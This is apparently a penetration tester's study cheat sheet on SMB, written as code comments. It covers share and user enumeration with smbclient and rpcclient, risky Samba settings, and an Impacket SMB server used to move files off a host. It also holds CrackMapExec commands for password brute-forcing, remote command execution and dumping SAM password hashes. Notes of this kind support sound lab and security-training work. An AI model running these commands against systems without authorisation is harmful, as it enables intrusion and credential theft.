// SMB ( Server Message Block )
//! smbclient
//* Anonymous login
// smbclient -N -L //{ip}/
//* Login
// smbclient -L //{ip}/ -U {username}%{password}
//* Commands
// ls => list files
// cd {dir} => change directory
// get => download file
//! rcpclient
// rpcclient -U "{username | null}%{password | null}" {ip} => connect to the server
// srvinfo =>	Server information.
// enumdomains =>	Enumerate all domains that are deployed in the network.
// querydominfo => 	Provides domain, server, and user information of deployed domains.
// netshareenumall => 	Enumerates all available shares.
// netsharegetinfo <share> =>	Provides information about a specific share.
// enumdomusers => 	Enumerates all domain users.
// queryuser <RID> =>	Provides information about a specific user.
//! Reading shares on windows
// win + r => \\{ip}\{share-name}
// cmd => dir \\{ip}\{share-name} /user:{username} {password}
//! Configuration
//* Config file
// /etc/samba/smb.conf
//* Dangerous settings
// browseable = yes => 	Allow listing available shares in the current share
// read only = no => 	Forbid the creation and modification of files
// writable = yes =>	Allow users to create and modify files
// guest ok = yes =>	Allow connecting to the service without using a password
// enable privileges = yes	=> Honor privileges assigned to specific SID
// create mask = 0777 =>	What permissions must be assigned to the newly created files
// directory mask = 0777=>	What permissions must be assigned to the newly created directories
// logon script = script.sh =>	What script needs to be executed on the user's login
// magic script = script.sh =>	Which script should be executed when the script gets closed
// magic output = script.out => 	Where the output of the magic script needs to be stored
//! Running an smb server with Impacket
// at virtenv
// sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/sleepwell/lab/
// to transfer a file to it use : move {file-name} \\{ip}\CompData
//! Crackmapexec
//* Brute forcing smb login
// crackmapexec smb {ip} -u {username} -p {password-list} --local-auth
//* RCE
// crackmapexec smb {ip} -u {smb-username} -p '{smb-password}' -x '{cmd}' --exec-method smbexec
//* Enumerating logged in users in a subnet
// crackmapexec smb {net-ip}/24 -u {smd-username} -p '{smb-password}' --loggedon-users
//* Extract Hashes from SAM Database
// crackmapexec smb {ip} -u {smb-username} -p '{smb-password}' --sam
